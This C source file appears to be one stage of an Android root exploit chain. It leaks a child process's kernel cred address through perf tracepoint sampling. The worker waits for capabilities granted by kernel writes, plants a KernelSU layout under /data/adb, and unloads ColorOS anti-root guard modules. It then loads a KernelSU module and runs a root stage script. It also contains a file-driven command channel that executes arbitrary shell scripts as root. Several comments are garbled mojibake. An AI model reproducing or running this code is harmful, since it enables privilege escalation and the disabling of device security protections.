/*
 * root_worker2.c -- 澶辫触閾句慨姝ｇ増
 *   parent: perf tracepoint 娉勬紡 worker(exec 鍚? 鐨?cred 鍦板潃 -> CHILD_CRED/CRED_CS
 *   worker: 杞鑷繁 /proc/self/status:
 *     (1) fsuid==0  -> 閾?/data/adb 甯冨眬 (ksud + ksu/bin/su 閾炬帴)
 *     (2) CapEff bit16 (CAP_SYS_MODULE) -> finit_module ksu-op3.ko + su 鑷
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/perf_event.h>
/* B' caps masks (UAPI capability numbers): CAP_CHOWN=0, CAP_DAC_OVERRIDE=1,
 * CAP_SYS_MODULE=16.  The engine lands two safe writes: capsA (0x3) then
 * capsB (adds bit16 while preserving bits 0..15). */
#define BPRIME_CAP_LAYOUT ((1ULL << 0) | (1ULL << 1))
#define BPRIME_CAP_FULL   (BPRIME_CAP_LAYOUT | (1ULL << 16))

#define TP_ID_FILE "/sys/kernel/tracing/events/kmem/kmem_cache_alloc/id"
#define LOGFILE "/data/local/tmp/koznroot/rkw.out"

static int read_id(void)
{
    FILE *f = fopen(TP_ID_FILE, "r");
    int id = -1;
    if (f) { if (fscanf(f, "%d", &id) != 1) id = -1; fclose(f); }
    return id;
}

static int open_ev_pid(int id, pid_t pid)
{
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof attr);
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = sizeof attr;
    attr.config = (unsigned long long)id;
    attr.sample_period = 1;
    attr.sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TID;
    attr.wakeup_events = 1;
    attr.disabled = 1;
    return (int)syscall(__NR_perf_event_open, &attr, pid, -1, -1, 0);
}

static int read_uids(unsigned long long *u)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    int ok = 0;
    if (!f) return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "Uid:", 4)) {
            if (sscanf(line + 4, "%llu %llu %llu %llu", &u[0], &u[1], &u[2], &u[3]) == 4) ok = 1;
            break;
        }
    }
    fclose(f);
    return ok;
}

static unsigned long long read_capeff(void)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    unsigned long long v = 0;
    if (!f) return 0;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "CapEff: %llx", &v) == 1) break;
    }
    fclose(f);
    return v;
}

static int copy_file(const char *src, const char *dst, mode_t mode)
{
    int in = open(src, O_RDONLY);
    if (in < 0) { printf("COPY open %s errno=%d\n", src, errno); return -1; }
    unlink(dst);
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (out < 0) { printf("COPY creat %s errno=%d\n", dst, errno); close(in); return -1; }
    char buf[65536];
    ssize_t n;
    long total = 0;
    while ((n = read(in, buf, sizeof buf)) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(out, buf + off, (size_t)(n - off));
            if (w <= 0) { printf("COPY write errno=%d\n", errno); close(in); close(out); return -1; }
            off += w;
        }
        total += n;
    }
    close(in);
    close(out);
    chmod(dst, mode);
    printf("COPY ok %s -> %s bytes=%ld\n", src, dst, total);
    return 0;
}

/* ===== B' research build (b1, 2026-11-01) ============================
 * Layout without fsuid=0.
 *
 * CAP_DAC_OVERRIDE lets us create entries under /data/adb while uid/fsuid
 * are still 2000.  Files created that way belong to uid 2000, so when the
 * same kernel write also grants CAP_CHOWN we hand them to root:root --
 * reproducing the old fsuid=0 layout that ksud/KernelSU expects.
 *
 * CAP_FOWNER is intentionally not required: chmod() happens while we still
 * own the new files, and pre-existing root-owned dirs are left untouched
 * (DAC_OVERRIDE is enough to traverse/write them).
 * ==================================================================== */
static int make_layout_dir(const char *path, unsigned long long cap)
{
    int created = (mkdir(path, 0700) == 0);
    int saved = errno;

    if (!created && saved != EEXIST) {
        printf("MKDIR %s errno=%d\n", path, saved);
        return -1;
    }
    if (created) {
        if (chmod(path, 0700) != 0) {
            printf("CHMOD %s errno=%d\n", path, errno);
            return -1;
        }
        if ((cap & (1ULL << 0)) && chown(path, 0, 0) != 0) {
            printf("CHOWN %s errno=%d\n", path, errno);
            return -1;
        }
        printf("MKDIR %s created=1\n", path);
    } else {
        struct stat st;
        printf("MKDIR %s created=0\n", path);
        /* A directory left by an earlier B' attempt may be owned by 2000;
         * fix it when CAP_CHOWN is available, otherwise it is still usable. */
        if (stat(path, &st) == 0 && st.st_uid != 0 && (cap & (1ULL << 0))) {
            if (chown(path, 0, 0) != 0)
                printf("CHOWN(existing) %s errno=%d\n", path, errno);
        }
    }
    return 0;
}

static int do_layout(unsigned long long cap)
{
    int ok = 1;
    printf("LAYOUT begin cap=%#llx\n", cap);

    if (make_layout_dir("/data/adb", cap) != 0) ok = 0;
    if (make_layout_dir("/data/adb/ksu", cap) != 0) ok = 0;
    if (make_layout_dir("/data/adb/ksu/bin", cap) != 0) ok = 0;
    if (make_layout_dir("/data/adb/modules", cap) != 0) ok = 0;

    if (copy_file("/data/local/tmp/koznroot/ksud342", "/data/adb/ksud", 0755) != 0) {
        ok = 0;
    } else if (chmod("/data/adb/ksud", 0755) != 0) {
        printf("CHMOD ksud errno=%d\n", errno);
        ok = 0;
    } else if ((cap & (1ULL << 0)) && chown("/data/adb/ksud", 0, 0) != 0) {
        printf("CHOWN ksud errno=%d\n", errno);
        ok = 0;
    }

    unlink("/data/adb/ksu/bin/su");
    unlink("/data/adb/ksu/bin/ksud");
    int r1 = symlink("/data/adb/ksud", "/data/adb/ksu/bin/su");
    int r2 = symlink("/data/adb/ksud", "/data/adb/ksu/bin/ksud");
    printf("symlink su rc=%d/%d errno=%d\n", r1, r2, errno);
    if (r1 != 0 || r2 != 0) ok = 0;
    if (cap & (1ULL << 0)) {
        /* chown(2) follows symlinks; the links themselves need lchown(2). */
        if (lchown("/data/adb/ksu/bin/su", 0, 0) != 0) {
            printf("LCHOWN su errno=%d\n", errno);
            ok = 0;
        }
        if (lchown("/data/adb/ksu/bin/ksud", 0, 0) != 0) {
            printf("LCHOWN ksud errno=%d\n", errno);
            ok = 0;
        }
    }
    {
        /* access(2) clears FS caps and uses the REAL uid (fs/open.c:383-443),
         * so it can never observe our caps; stat(2) uses current creds and
         * CAP_DAC_OVERRIDE applies. */
        struct stat st;
        int ksud_ok = stat("/data/adb/ksud", &st) == 0 &&
                      st.st_uid == 0 && (st.st_mode & 0777) == 0755;
        int su_ok = stat("/data/adb/ksu/bin/su", &st) == 0 && st.st_uid == 0;
        int adb_ok = stat("/data/adb", &st) == 0 && st.st_uid == 0;
        printf("LAYOUT_VERIFY ksud=%d su=%d adb_root=%d\n", ksud_ok, su_ok, adb_ok);
        if (!ksud_ok || !su_ok || !adb_ok) ok = 0;
    }
    printf(ok ? "LAYOUT_DONE\n" : "LAYOUT_INCOMPLETE\n");
    fflush(stdout);
    return ok ? 0 : -1;
}

/* 绠€鍗曠殑 root 鍛戒护閫氶亾: echo cmd > rkw_cmd, 杈撳嚭杩?rkw_cmd_out */
static void try_cmd_channel(void)
{
    if (access("/data/local/tmp/koznroot/rkw_cmd", F_OK) != 0)
        return;
    rename("/data/local/tmp/koznroot/rkw_cmd", "/data/local/tmp/koznroot/rkw_cmd.run");
    unlink("/data/local/tmp/koznroot/rkw_cmd_out");
    system("/system/bin/sh /data/local/tmp/koznroot/rkw_cmd.run > /data/local/tmp/koznroot/rkw_cmd_out 2>&1");
    FILE *m = fopen("/data/local/tmp/koznroot/rkw_cmd_done", "w");
    if (m) fclose(m);
    unlink("/data/local/tmp/koznroot/rkw_cmd.run");
    printf("CMD done\n");
    fflush(stdout);
}

static int load_ksu(void)
{
    int fd = open("/data/local/tmp/koznroot/ksu-op3.ko", O_RDONLY);
    if (fd < 0) { printf("KO open errno=%d\n", errno); return -1; }
    errno = 0;
    long rc = syscall(SYS_finit_module, fd, "allow_shell=1 bundled=1", 0);
    int e = errno;
    close(fd);
    printf("FINT_MODULE rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
    return (int)rc;
}

static void check_module(void)
{
    FILE *f = fopen("/proc/modules", "r");
    char line[512];
    int found = 0;
    if (f) {
        while (fgets(line, sizeof line, f)) {
            if (strstr(line, "kernelsu")) { printf("MODULE %s", line); found = 1; }
        }
        fclose(f);
    }
    if (!found) printf("MODULE not found\n");
}

static void su_test(void)
{
    int out = open("/data/local/tmp/koznroot/su_test.out", O_WRONLY | O_CREAT | O_TRUNC, 0666);
    pid_t p = fork();
    if (p == 0) {
        if (out >= 0) { dup2(out, 1); dup2(out, 2); }
        char *argv[] = { (char *)"su", (char *)"-c",
                         (char *)"id; getenforce; grep -i kernelsu /proc/modules", NULL };
        char *envp[] = { (char *)"PATH=/data/adb/ksu/bin:/system/bin:/system/xbin",
                         (char *)"HOME=/data/local/tmp/koznroot", NULL };
        execve("/system/bin/su", argv, envp);
        printf("EXEC_FAIL errno=%d(%s)\n", errno, strerror(errno));
        _exit(127);
    }
    if (out >= 0) close(out);
    if (p > 0) {
        int st = 0;
        waitpid(p, &st, 0);
        printf("SU_TEST done status=%d exit=%d sig=%d\n", st,
               WIFEXITED(st) ? WEXITSTATUS(st) : -1, WIFSIGNALED(st) ? WTERMSIG(st) : 0);
    } else {
        printf("SU_TEST fork errno=%d\n", errno);
    }
}

/*
 * Run root_stage.sh through the kernel su hook (execve redirect -> ksud root).
 * This keeps the whole KSU userspace setup independent of the app's shell
 * channel: if Stellar/the shell service dies after the module is loaded, the
 * worker still finishes the job on its own.
 */
static int run_root_stage_via_su(void)
{
    printf("RUN_ROOT_STAGE_VIA_SU\n");
    fflush(stdout);
    int rc = -1;
    pid_t p = fork();
    if (p == 0) {
        int out = open("/data/local/tmp/koznroot/root_stage_out.txt",
                       O_WRONLY | O_CREAT | O_APPEND, 0666);
        if (out >= 0) { dup2(out, 1); dup2(out, 2); }
        char *argv[] = { (char *)"su", (char *)"-c",
                         (char *)"/system/bin/sh /data/local/tmp/koznroot/root_stage.sh", NULL };
        char *envp[] = { (char *)"PATH=/data/adb/ksu/bin:/system/bin:/system/xbin",
                         (char *)"HOME=/data/local/tmp/koznroot", NULL };
        execve("/system/bin/su", argv, envp);
        printf("ROOT_STAGE_SU_EXEC_FAIL errno=%d(%s)\n", errno, strerror(errno));
        _exit(127);
    }
    if (p > 0) {
        int st = 0;
        waitpid(p, &st, 0);
        rc = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
        printf("ROOT_STAGE_SU_DONE status=%d exit=%d\n", st, rc);
        fflush(stdout);
        int m = open("/data/local/tmp/koznroot/rkw_stage_done", O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (m >= 0) {
            dprintf(m, "rc=%d\n", rc);
            close(m);
        }
    } else {
        printf("ROOT_STAGE_SU_FORK_FAIL errno=%d\n", errno);
        fflush(stdout);
    }
    return rc;
}

static void worker_main(void)
{
    signal(SIGPIPE, SIG_IGN);
    prctl(PR_SET_NAME, "RKW", 0, 0, 0);
    printf("WORKER_BPRIME build=b3 caps-two-write-dedupe\n");
    printf("WORKER pid=%d\n", (int)getpid());
    fflush(stdout);

    int layout_done = 0, mod_tried = 0, caps_seen = 0, root_stage_done = 0;
    int caps_layout_seen = 0;
    for (int i = 0; i < 14400; i++) {  /* 2h at 500ms */
        unsigned long long u[4] = {0};
        unsigned long long cap;
        usleep(500000);
        if (access("/data/local/tmp/koznroot/rkw_stop", F_OK) == 0) {
            printf("WORKER stop marker\n");
            break;
        }
        if (!read_uids(u)) continue;
        cap = read_capeff();
        if ((i % 8) == 0) {
            printf("STATUS t=%d uid=%llu/%llu/%llu fs=%llu cap=%#llx layout=%d mod=%d\n",
                   i, u[0], u[1], u[2], u[3], cap, layout_done, mod_tried);
            fflush(stdout);
        }
        try_cmd_channel();
                /* B': layout can start as soon as CAP_DAC_OVERRIDE arrives; the same
         * kernel write also grants CAP_CHOWN, so the created files become
         * root-owned like they were in the legacy fsuid=0 flow.  The old
         * fsuid==0 trigger is kept as a fallback for the legacy chain. */
        if (!caps_layout_seen && (cap & BPRIME_CAP_LAYOUT) == BPRIME_CAP_LAYOUT) {
            caps_layout_seen = 1;
            printf("CAPS_LAYOUT_SEEN cap=%#llx\n", cap);
            fflush(stdout);
        }
        /* B'-2: layout needs BOTH caps from capsA (V=0x3 @ cred+0x40):
         * DAC_OVERRIDE for /data/adb and CHOWN to hand the files to root.
         * u[3]==0 remains the legacy fsuid chain fallback. */
        if (!layout_done && (((cap & BPRIME_CAP_LAYOUT) == BPRIME_CAP_LAYOUT) || u[3] == 0)) {
            printf("LAYOUT_TRIGGER cap=%#llx uid=%llu fs=%llu\n", cap, u[0], u[3]);
            fflush(stdout);
            if (do_layout(cap) == 0) {
                layout_done = 1;
                printf("LAYOUT_DONE_MARK\n");
            } else {
                printf("LAYOUT_RETRY\n");
            }
            fflush(stdout);
        }
        /* 一旦 real uid 变成 0,就以 root 身份跑 root_stage.sh 完成 KSU 用户态收尾 */
        if (u[0] == 0 && !root_stage_done) {
            root_stage_done = 1;
            printf("UID0_DETECTED running root_stage.sh\n");
            fflush(stdout);
            system("/system/bin/sh /data/local/tmp/koznroot/root_stage.sh >> /data/local/tmp/koznroot/root_stage_out.txt 2>&1");
            printf("ROOT_STAGE_DONE\n");
            fflush(stdout);
        }
        if (cap & (1ULL << 16)) {
            if (!caps_seen) {
                caps_seen = 1;
                printf("CAPS_SEEN cap=%#llx\n", cap);
                fflush(stdout);
                /* EARLIEST possible rmmod point: we just got CAP_SYS_MODULE,
                 * while SELinux is still Permissive (perm stage just lowered
                 * it). Unload the ColorOS anti-root guard right now -- if we
                 * wait, it flips selinux_state back to Enforcing, and then
                 * ksu_grant's exec of root_stage.sh fails (EXEC_FAIL): su
                 * stays broken and the manager never activates. */
                /* system("rmmod ...") execs /system/bin/sh, and exec drops
                 * every capability, so it can never work here.  Call
                 * delete_module(2) in-process while CAP_SYS_MODULE is still
                 * in cap_effective.  Best effort: a busy guard module just
                 * returns EBUSY and root_stage.sh retries it as root. */
                static const char *const guard_mods[] = {
                    "oplus_secure_guard_new", "oplus_secure_common", "oplusboot",
                };
                for (size_t g = 0; g < sizeof(guard_mods) / sizeof(guard_mods[0]); g++) {
                    long rrc;
                    errno = 0;
                    rrc = syscall(SYS_delete_module, guard_mods[g], O_NONBLOCK);
                    printf("RMMOD %s rc=%ld errno=%d\n", guard_mods[g], rrc,
                           rrc != 0 ? errno : 0);
                }
                fflush(stdout);

                fflush(stdout);
            }
            /* 只有 fsuid=0 也满足时才加载 LKM,保证 ksu_cred 继承 fsuid=0 */
            /* ksu_cred is a prepare_creds() copy of the loading task: at the
             * finit_module instant the cred must carry BOTH capsA bits and
             * CAP_SYS_MODULE.  A stale capsA landing resets cap_effective to
             * 0x3 -- require the full mask so that case blocks the load.
             * u[3]==0 keeps the legacy-A fallback working. */
            if (!mod_tried && (u[3] == 0 ||
                               (layout_done && (cap & BPRIME_CAP_FULL) == BPRIME_CAP_FULL))) {
                mod_tried = 1;
                cap = read_capeff();
                printf("CAP_MODULE_DETECTED cap=%#llx layout=%d fs=%llu\n",
                       cap, layout_done, u[3]);
                fflush(stdout);
                int rc = load_ksu();
                sleep(2);
                check_module();
                if (rc == 0) {
                    su_test();
                    if (run_root_stage_via_su() == 0)
                        root_stage_done = 1;
                    /* (anti-root guard was already unloaded at CAPS_SEEN,
                     * before the LKM load) */
                }
                system("/system/bin/sh -c 'dmesg | tail -400 > /data/local/tmp/koznroot/dmesg_after_load.txt 2>&1'");
                fflush(stdout);
                FILE *m = fopen("/data/local/tmp/koznroot/rkw_done", "w");
                if (m) { fprintf(m, "rc=%d layout=%d\n", rc, layout_done); fclose(m); }
            }
        }
    }
    fflush(stdout);
    _exit(0);
}

int main(int argc, char **argv)
{
    if (argc >= 2 && !strcmp(argv[1], "--worker"))
        worker_main();

    int id = read_id();
    printf("TP id=%d\n", id);
    fflush(stdout);
    if (id < 0) return 1;

    int pipefd[2];
    if (pipe(pipefd) != 0) return 1;
    pid_t child = fork();
    if (child == 0) {
        close(pipefd[1]);
        char c;
        if (read(pipefd[0], &c, 1) != 1) _exit(1);
        close(pipefd[0]);
        execl("/proc/self/exe", "root_worker2", "--worker", (char *)NULL);
        _exit(2);
    }
    if (child < 0) return 1;
    close(pipefd[0]);

    int fd = open_ev_pid(id, child);
    printf("perf fd=%d errno=%d child=%d\n", fd, errno, fd >= 0 ? 0 : errno, (int)child);
    fflush(stdout);
    if (fd < 0) { kill(child, 9); return 2; }

    size_t pg = (size_t)sysconf(_SC_PAGESIZE);
    void *map = mmap(NULL, pg * 9, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { kill(child, 9); return 3; }
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    if (write(pipefd[1], "x", 1) != 1) { }
    close(pipefd[1]);
    usleep(400000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    usleep(30000);

    struct perf_event_mmap_page *mp = (struct perf_event_mmap_page *)map;
    unsigned char *data = (unsigned char *)map + pg;
    size_t datasz = pg * 8;
    unsigned long long tail = mp->data_tail;
    unsigned long long cred = 0, cs_save = 0;
    int n = 0;
    while (tail < mp->data_head) {
        unsigned long long off = tail % datasz;
        struct perf_event_header *h = (struct perf_event_header *)(data + off);
        if (h->size < sizeof(*h) || off + h->size > datasz) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            unsigned char *p = (unsigned char *)h + sizeof(*h);
            p += 8;
            unsigned int rawsz = *(unsigned int *)p;
            unsigned char *raw = p + 4;
            if (rawsz >= 28) {
                unsigned long long cs = *(unsigned long long *)(raw + 8);
                unsigned long long ptr = *(unsigned long long *)(raw + 16);
                unsigned int loc = *(unsigned int *)(raw + 24);
                unsigned int noff = loc & 0xffff, nlen = (loc >> 16) & 0xffff;
                char nm[48] = {0};
                if (noff + nlen <= rawsz && nlen < 47) { memcpy(nm, raw + noff, nlen); nm[nlen] = 0; }
                if (!strcmp(nm, "cred")) { cred = ptr; cs_save = cs; }
            }
            n++;
        }
        tail += h->size;
    }
    mp->data_tail = tail;
    printf("samples=%d\n", n);
    if (cred) printf("CHILD_PID=%d\nCHILD_CRED=0x%llx\nCRED_CS=0x%llx\n", (int)child, cred, cs_save);
    else printf("NO_CHILD_CRED\n");
    fflush(stdout);
    return 0;
}

